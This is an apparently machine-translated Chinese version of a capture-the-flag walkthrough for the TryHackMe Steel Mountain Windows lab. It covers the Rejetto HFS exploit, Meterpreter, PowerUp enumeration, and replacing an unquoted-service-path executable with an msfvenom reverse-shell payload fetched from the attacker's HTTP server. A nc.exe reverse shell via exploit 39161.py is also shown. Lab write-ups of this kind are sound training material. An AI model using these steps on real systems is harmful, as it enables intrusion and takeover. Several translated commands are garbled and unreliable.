<html>
<head>
<title>Windows PrivEsc or How to Crack the TryHackMe Steel Mountain Machine.</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Windows PrivEsc或者如何破解TryHackMe钢山机。</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/windows-privesc-or-how-to-crack-the-tryhackme-steel-mountain-machine-fdd7dc19ada3?source=collection_archive---------0-----------------------#2020-09-05">https://infosecwriteups.com/windows-privesc-or-how-to-crack-the-tryhackme-steel-mountain-machine-fdd7dc19ada3?source=collection_archive---------0-----------------------#2020-09-05</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><h2 id="c5c5" class="ir is it bd b dl iu iv iw ix iy iz dk ja translated" aria-label="kicker paragraph"><a class="ae ep" href="https://medium.com/@vadimpolovnikov" rel="noopener"> TryHackMe写文章</a></h2><div class=""/><div class=""><h2 id="d2fc" class="pw-subtitle-paragraph jz jc it bd b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq dk translated">Metasploit、Exploit-DB、PowerShell等等。</h2></div><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi kr"><img src="../Images/b9e9952c1320943991c3aa92363e964f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-MzLYdlBJpC7YYlAvQCfSw.jpeg"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">从<a class="ae lh" href="https://www.whats-on-netflix.com/news/are-seasons-1-to-4-of-mr-robot-on-netflix/" rel="noopener ugc nofollow" target="_blank">检索到网飞有什么</a></figcaption></figure><p id="c1b1" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">你好啊。这里有一个关于TryHackMe Steel Mountain机器的教育演练。如果你还在纠结，或者只是想看看解决挑战的另一种方法，那么你绝对是在正确的地方！事不宜迟，让我们开始吧。</p></div><div class="ab cl me mf hx mg" role="separator"><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj"/></div><div class="im in io ip iq"><h2 id="29c7" class="ml mm it bd mn mo mp dn mq mr ms dp mt lr mu mv mw lv mx my mz lz na nb nc iz bi translated">[任务1] —简介</h2><p id="9904" class="pw-post-body-paragraph li lj it lk b ll nd kd ln lo ne kg lq lr nf lt lu lv ng lx ly lz nh mb mc md im bi translated">首先，我们需要进行端口扫描！因此，让我们启动一些Nmap扫描，并确定潜在的攻击媒介。</p><p id="416a" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">我通常从所谓的(主要是我自己)<strong class="lk jd"> <em class="ni">基础</em> </strong>和<strong class="lk jd"> <em class="ni"> vuln </em> </strong> Nmap扫描开始:</p><blockquote class="nj nk nl"><p id="6333" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated"><strong class="lk jd">Nmap-sC-sV-O $ IP-oN basic _ scan . Nmap</strong></p><p id="c7dd" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated"><strong class="lk jd">Nmap-script = vuln $ IP-oN vuln _ scan . Nmap</strong></p></blockquote><p id="7ee5" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">这两者的一个小分类:</p><p id="fc84" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">基本扫描</strong>。在<em class="ni"> -oN </em>之前的所有开关都可以替换为单个<em class="ni"> -A </em>开关(主动式),因为它组合了所有这些开关并增加了traceroute。最终，我们将扫描目标的操作系统和软件版本以及默认的NSE脚本。</p><p id="8cb5" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">外阴扫描</strong>。这个很简单。它扫描系统，收集属于<em class="ni"> vuln </em>类别的NSE脚本。这是值得的，因为有时它可能会揭示一些有趣的东西。剧透警报！这次不会。</p><p id="3f36" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">这里有一点美味的鸡块。您是否注意到两个命令中都有$IP？如果您总是在Kali VM和TryHackMe窗口之间来回切换以检查IP地址，请尝试以下命令:</p><blockquote class="nj nk nl"><p id="890c" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated"><strong class="lk jd">出口IP =&lt;X . X . X .&gt;T29】</strong></p></blockquote><p id="d3ef" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">这将在系统中创建一个环境变量，您不需要一次又一次地重新输入IP地址(只需使用$IP代替)。另一个技巧是将目标IP地址放在<em class="ni">主机</em>文件中。</p><p id="09db" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">够了，让我们回到Nmap扫描结果。</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi np"><img src="../Images/d73cecfb08a87809c4afb672d92c6988.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fKj8tMG56fOP-U0td0i7Jg.png"/></div></div></figure><p id="2d17" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">我知道什么立刻引起了你的注意。不要犹豫，跳进那个网站！</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi nq"><img src="../Images/1fcc33fdb5966df9206d36ff39a8c8f6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*igd-fWzGVkyD96OWrsqGwA.png"/></div></div></figure><p id="a2a6" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">我打赌这家伙那个月干得相当不错！但是他叫什么名字？<em class="ni">您检查过图像名称了吗？点击右键，查看图片，你会得到第一个答案。</em></p></div><div class="ab cl me mf hx mg" role="separator"><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj"/></div><div class="im in io ip iq"><h2 id="2097" class="ml mm it bd mn mo mp dn mq mr ms dp mt lr mu mv mw lv mx my mz lz na nb nc iz bi translated">[任务2] —初始访问</h2><p id="a69e" class="pw-post-body-paragraph li lj it lk b ll nd kd ln lo ne kg lq lr nf lt lu lv ng lx ly lz nh mb mc md im bi translated">我相信在我们的朋友Nmap的帮助下，你已经回答了前几个问题。继续下一个。</p><p id="5c26" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">为了找到CVE号码，只需谷歌HTTP文件服务器的版本，毫无疑问，你会得到你想要的。</p><blockquote class="nr"><p id="50de" class="ns nt it bd nu nv nw nx ny nz oa md dk translated">记住，在我们的运动中，谷歌就是一切！你在学习的过程中，没什么好羞愧的。我经常看到我最喜欢的黑客在最重要的工具之一——谷歌的帮助下获得另一个外壳。</p></blockquote><p id="32ef" class="pw-post-body-paragraph li lj it lk b ll ob kd ln lo oc kg lq lr od lt lu lv oe lx ly lz of mb mc md im bi translated">现在有趣的事情来了！唤醒野兽，Metasploit，让我们获得对目标的初始访问。</p><p id="258e" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">为了找到漏洞，只需在Metasploit控制台中键入<strong class="lk jd"> <em class="ni"> search rejetto </em> </strong>。只有一个漏洞可以利用:</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi og"><img src="../Images/1dc6a3c200e1c763695c5dc8cb458d5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cYMYHUUQKSQ68P5HHJgNJA.png"/></div></div></figure><p id="a691" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">太棒了。选择模块的常见选项是简单地在<strong class="lk jd"> <em class="ni">使用</em> </strong>关键字后键入(或键入)模块名称。然而，有一个甜蜜的简短替代物——<strong class="lk jd"><em class="ni">使用&lt;模块&gt; </em> </strong>。</p><p id="6e2d" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">在选择模块之后，知道它期望从我们这里得到什么参数是很重要的。最好的方法是发出<strong class="lk jd"> <em class="ni"> show options </em> </strong>命令，并查找那些将<em class="ni"> Required </em> filed设置为<em class="ni"> yes </em>的选项。</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi oh"><img src="../Images/3750c6ef62833a68e23a3ba293f853ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BjtGVAm3r9pINQKoR8AYKw.png"/></div></div></figure><p id="3cbc" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">当一切都<strong class="lk jd"> <em class="ni">设定好</em> </strong>后，我们就准备点击那个<strong class="lk jd"> <em class="ni">利用</em> </strong>的按钮并得到外壳。</p><p id="7d95" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">获得Meterpreter shell后，您可以使用基本的Linux命令浏览目录，并在Bill的桌面上找到一个有趣的文件。哎呀！</p><blockquote class="nj nk nl"><p id="be98" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated">请注意，如果您发出一个简单的命令，如<strong class="lk jd"> whoami </strong>并想知道为什么它不起作用，请查看<strong class="lk jd"> help </strong>命令。花点时间观察输出，并为Meterpreter的强大做好准备——它不是每台计算机上都有的常规外壳。</p></blockquote></div><div class="ab cl me mf hx mg" role="separator"><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj"/></div><div class="im in io ip iq"><h2 id="37f8" class="ml mm it bd mn mo mp dn mq mr ms dp mt lr mu mv mw lv mx my mz lz na nb nc iz bi translated">[任务3] —权限提升</h2><p id="20f2" class="pw-post-body-paragraph li lj it lk b ll nd kd ln lo ne kg lq lr nf lt lu lv ng lx ly lz nh mb mc md im bi translated">现在真的越来越有趣了！TryHackMe很好地解释了如何获得用于枚举Windows系统的PowerUp.ps1脚本，但是我在安装它时遇到了一些困难。因此，万一有什么困难，我愿意帮助你。</p><p id="f67f" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">点击[Task 3]部分的链接，您将进入GitHub页面，这里有PowerUp.ps1的源代码。</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi oi"><img src="../Images/2c202433026915bbc9810dddb854c9de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XWljw8dYCRN5pu4RxxmxUg.png"/></div></div></figure><p id="e2ae" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">只需转到左上角的PowerSploit目录，然后点击绿色的<strong class="lk jd"> <em class="ni">代码</em> </strong>按钮复制链接即可。</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi oj"><img src="../Images/0288c760b753675737636d650b970d86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WLIqPNKggoA1PceW2A_iPQ.png"/></div></div></figure><p id="19b9" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">对于这个特殊的挑战，你只需要启动脚本，但你会继续黑客，对不对？所以剩下的脚本可能会在你未来的冒险中派上用场。只需使用<strong class="lk jd"> <em class="ni"> git clone </em> </strong>命令<em class="ni">后跟你复制的链接</em>，瞧！一整套脚本在你的黑客口袋里，随时准备摇滚。</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi ok"><img src="../Images/8ac2382a7a97aabe492e5547aebc33c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HJzk3kSOKIolgwstS263TQ.png"/></div></div></figure><p id="581f" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">在目标机器枚举之前，我们需要上传PowerUp脚本并将PowerShell模块加载到Meterpreter。下面的屏幕截图描述了该序列。</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi ol"><img src="../Images/b55ed2c860c2e10c90c3fda0f7682206.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l6WCeRdHPeOsxPQ4WsOvJw.png"/></div></div></figure><p id="553f" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">现在，我们准备列举目标。在Meterpreter中键入<strong class="lk jd"> <em class="ni"> powershell_shell </em> </strong>启动PowerShell模块，执行<strong class="lk jd"> <em class="ni"> PowerUp.ps1 </em> </strong>脚本和<strong class="lk jd"><em class="ni">Invoke-all checks</em></strong>。TryHackMe建议寻找带有<a class="ae lh" href="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae" rel="noopener"> <em class="ni">未引用服务路径</em> </a> <em class="ni"> </em>的服务(我非常推荐你访问<a class="om on ep" href="https://medium.com/u/711dc14dea6c?source=post_page-----fdd7dc19ada3--------------------------------" rel="noopener" target="_blank">苏米特·维尔马</a>撰写的这篇解释未引用服务路径漏洞的中型帖子)。简而言之:</p><blockquote class="nj nk nl"><p id="33bf" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated">当可执行文件的路径包含空格(/Path To/The Executable/File.exe)并且没有用引号括起来时，就会出现未加引号的服务路径漏洞，因此Windows系统会将空格之前的每个参数解释为可执行文件(Path.exe，The.exe，File.exe ),直到找到实际的文件。</p></blockquote><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi oo"><img src="../Images/fb8e10a571cdeb084463c96799625378.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IZAUKqEu8VU2s8iepbv_Vw.png"/></div></div></figure><p id="a955" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">在上面的截图中，ASCService.exe的<strong class="lk jd"> <em class="ni">是位于未引用的服务路径中的可执行文件。此外，它在<em class="ni"> LocalSystem </em>特权下运行，这是我们在Windows系统中可以获得的最高特权。因此，我们可以利用这个优势，用我们自己的由<a class="ae lh" href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" rel="noopener ugc nofollow" target="_blank"> MSFvenom </a>工具生成的有效载荷替换ASCService.exe。</em></strong></p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi op"><img src="../Images/227078356cac2f8b26a9e337a609242b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CQUwRKEctNqOQV3duLBzkg.png"/></div></div></figure><p id="df56" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">我们刚刚做了什么？嗯…让我们仔细看看。</p><blockquote class="nj nk nl"><p id="b6f3" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated"><strong class="lk jd"> <em class="it"> -p </em> </strong>指定有效载荷(<strong class="lk jd"><em class="it">--list =有效载荷</em> </strong>查看全部)</p><p id="efba" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated"><strong class="lk jd"> <em class="it"> lhost </em> </strong> —本地主机的IP地址</p><p id="983c" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated"><strong class="lk jd"> <em class="it"> lport </em> </strong> —本地主机将监听的端口号</p><p id="9fed" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated"><strong class="lk jd"> <em class="it"> -e </em> </strong>决定防火墙规避的编码器(<strong class="lk jd"><em class="it">--list =编码器</em> </strong>)</p><p id="a88f" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated"><strong class="lk jd"> <em class="it"> -f </em> </strong> <em class="it"> </em>是可执行文件的文件类型</p></blockquote><p id="817c" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">下一步是将我们的文件上传到目标服务器，并更改合法可执行文件的内容。是时候学习一些PowerShell命令了！</p><p id="2fc7" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">首先是</strong>，我们需要上传我们的<strong class="lk jd"><em class="ni"/></strong>。两个命令将为我们做这件事。</p><blockquote class="nj nk nl"><p id="f18b" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated">your-local-machine<strong class="lk jd">#<em class="it">python-m simple http server</em>8888</strong></p><p id="71cc" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated">目标-机器-PS<strong class="lk jd">#<em class="it">Invoke-WebRequest-Uri</em>" http://x . x . x:8888 "<em class="it">-Outfile</em>ASCService.exe</strong></p></blockquote><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi oq"><img src="../Images/8ab262513f9e84496d10c681102727a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*702lw9aY7Smrt2bCXzQSww.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">攻击机器上Python的简单HTTP服务器</figcaption></figure><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi or"><img src="../Images/8c7bb58ad353cf260bd7c90bfd9d3b71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hoQniqeGFzw_rXyDTSKuZg.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">可执行文件成功下载到目标服务器</figcaption></figure><p id="6d44" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">第二个</strong>，在替换合法的ASCService.exe之前，必须停止AdvancedSystemCareService9，因为它依赖于我们将要更改的可执行文件。只需在PowerShell中发出<strong class="lk jd"><em class="ni">Stop-Service advancedsystemcareservice 9</em></strong>命令。</p><p id="0166" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">最后但同样重要的是，让我们把好的ASCService.exe换成坏的ASCService.exe。</p><ol class=""><li id="79bb" class="os ot it lk b ll lm lo lp lr ou lv ov lz ow md ox oy oz pa bi translated">对恶意ASCService.exe文件执行<strong class="lk jd"> <em class="ni"> Copy-Item </em> </strong>命令，更改合法文件。</li><li id="81c3" class="os ot it lk b ll pb lo pc lr pd lv pe lz pf md ox oy oz pa bi translated">使用<strong class="lk jd"> <em class="ni"> Set-Location </em> </strong>命令在高级SystemCare目录中找到自己。</li><li id="57aa" class="os ot it lk b ll pb lo pc lr pd lv pe lz pf md ox oy oz pa bi translated">检查全新ASCService.exe的长度(与我们用Msfvenom制作的相比)。</li></ol><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi pg"><img src="../Images/cfa018fae51c76bed14331ebcd53da7c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9UqAmos8p16mCwqs4wFAmw.png"/></div></div></figure><p id="1928" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">在开始我们的服务之前，不要忘记激活本地机器上的监听器(<strong class="lk jd"> <em class="ni"> nc -lvnp 6666 </em> </strong>)。</p><p id="66e7" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">现在，我们已经为最后一步做好了一切准备！让我们在Windows命令shell中使用<a class="ae lh" href="https://docs.microsoft.com/en-us/windows/win32/services/starting-services-on-demand" rel="noopener ugc nofollow" target="_blank">服务控制</a>实用程序启动服务——只需键入<strong class="lk jd"><em class="ni">sc start advancedsystemcareservice 9</em></strong>——然后等待反向shell生成。</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi ph"><img src="../Images/f68504d7c0ef34822e8142c77cd12154.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MO3u72pWawUrQLsh62uRQQ.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">瞧啊。</figcaption></figure><p id="70f2" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">现在，最简单的部分！浏览一下系统目录，别忘了看看管理员桌面。</p></div><div class="ab cl me mf hx mg" role="separator"><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj mk"/><span class="mh bw bk mi mj"/></div><div class="im in io ip iq"><h2 id="6f55" class="ml mm it bd mn mo mp dn mq mr ms dp mt lr mu mv mw lv mx my mz lz na nb nc iz bi translated">[任务4] —不使用Metasploit的访问和上报</h2><p id="575d" class="pw-post-body-paragraph li lj it lk b ll nd kd ln lo ne kg lq lr nf lt lu lv ng lx ly lz nh mb mc md im bi translated">要在没有Metasploit的情况下访问系统，我们需要对Exploit-DB中的Rejetto文件服务器漏洞进行一些研究。您可以在互联网上探索它，或者使用<strong class="lk jd"> <em class="ni"> searchsploit </em> </strong>命令使用离线Exploit-DB数据库。</p><blockquote class="nj nk nl"><p id="7586" class="li lj ni lk b ll lm kd ln lo lp kg lq nm ls lt lu nn lw lx ly no ma mb mc md im bi translated"><strong class="lk jd"/></p></blockquote><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi pi"><img src="../Images/e4f9665d947668c63ce2d8803ce7c4a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U62teOZ_ud6XQwx0qE3k3g.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">请注意39161.py漏洞</figcaption></figure><p id="f71b" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">您可以随时使用<strong class="lk jd"> <em class="ni"> searchsploit -x &lt;漏洞名称&gt; </em> </strong>命令(searchsploit -x 39161.py)来探索每个漏洞的内容。</p><p id="50d4" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">阅读作者的描述，浏览代码，试着理解它是做什么的。简而言之，我们将运行该漏洞两次:</p><p id="bf31" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">第一阶段</strong>。该漏洞将在本地机器文件系统中查找nc.exe文件，并将其上传到目标机器。</p><p id="a164" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">第二阶段</strong>。该漏洞将在目标服务器上执行nc.exe，迫使其连接到我们的本地主机。</p><p id="ae7f" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">让我们为我们的攻击成功做好准备。</p><p id="f4d6" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">首先</strong>，我们需要将39161.py漏洞复制到我们从/usr/share/exploit db/exploits/windows/remote/39161 . py中选择的目录。</p><p id="9640" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">第二个</strong>，作者建议我们更改代码中的<em class="ni"> ip_addrs </em>和<em class="ni"> local_por </em> t变量，这样我们将在第二个开发阶段把服务器连接回我们的机器。</p><p id="04e0" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">第三</strong>，在安装了nc.exe的目录下设置<em class="ni"> Python SimpleHTTPServer监听端口80 </em>，这样漏洞会检索可执行文件并上传到目标。</p><p id="42bb" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated"><strong class="lk jd">第四个</strong>，用<em class="ni"> local_port变量值</em>的监听端口激活NetCat监听器。</p><p id="28c1" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">运行一次，然后重复。下面的截图将展示每个步骤的预期结果。</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi pj"><img src="../Images/b406fe52aba26748e7d16bef7d78f8ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*txyNoR-oSEpdVubaAbbnyg.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">第一次运行用于nc.exe上传，第二次运行用于反向shell生成</figcaption></figure><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi pk"><img src="../Images/5c6919f87d77e1fb17f86f9ef49f75d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1utFVL_Vrq8TBZL3iomUuA.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">成功的nc.exe检索</figcaption></figure><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div role="button" tabindex="0" class="kx ky di kz bf la"><div class="gh gi pl"><img src="../Images/cc6f6f99f17d99af74e7c611be657d47.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gXTLIjSBxlrspD3iUkmSjQ.png"/></div></div><figcaption class="ld le gj gh gi lf lg bd b be z dk translated">目标服务器反向外壳连接</figcaption></figure><p id="f6ee" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">我们进去了。现在，到目前为止，唯一剩下的事情就是像我们之前做的那样，使用<em class="ni">powershell-c</em><a class="ae lh" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7" rel="noopener ugc nofollow" target="_blank"><em class="ni">Invoke-WebRequest</em></a>命令将<a class="ae lh" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" rel="noopener ugc nofollow" target="_blank"> WinPEAS </a>脚本下载到目标服务器，并扫描系统的潜在漏洞。</p><p id="2131" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">非常感谢你花时间和我在一起，请继续关注。</p><p id="ae1e" class="pw-post-body-paragraph li lj it lk b ll lm kd ln lo lp kg lq lr ls lt lu lv lw lx ly lz ma mb mc md im bi translated">您可能还会对另一篇TryHackMe文章感兴趣。</p><div class="pm pn gp gr po pp"><a href="https://medium.com/@vadimpolovnikov/tryhackme-mr-robot-machine-c33476f12c48" rel="noopener follow" target="_blank"><div class="pq ab fo"><div class="pr ab ps cl cj pt"><h2 class="bd jd gy z fp pu fr fs pv fu fw jc bi translated">试试看机器人先生。</h2><div class="pw l"><h3 class="bd b gy z fp pu fr fs pv fu fw dk translated">找到进入定制机器人先生机器的方法。</h3></div><div class="px l"><p class="bd b dl z fp pu fr fs pv fu fw dk translated">medium.com</p></div></div><div class="py l"><div class="pz l qa qb qc py qd lb pp"/></div></div></a></div><div class="pm pn gp gr po pp"><a href="https://medium.com/@vadimpolovnikov/tryhackme-basic-pentesting-walkthrough-7817c719fd04" rel="noopener follow" target="_blank"><div class="pq ab fo"><div class="pr ab ps cl cj pt"><h2 class="bd jd gy z fp pu fr fs pv fu fw jc bi translated">TryHackMe基本测试演练。</h2><div class="pw l"><h3 class="bd b gy z fp pu fr fs pv fu fw dk 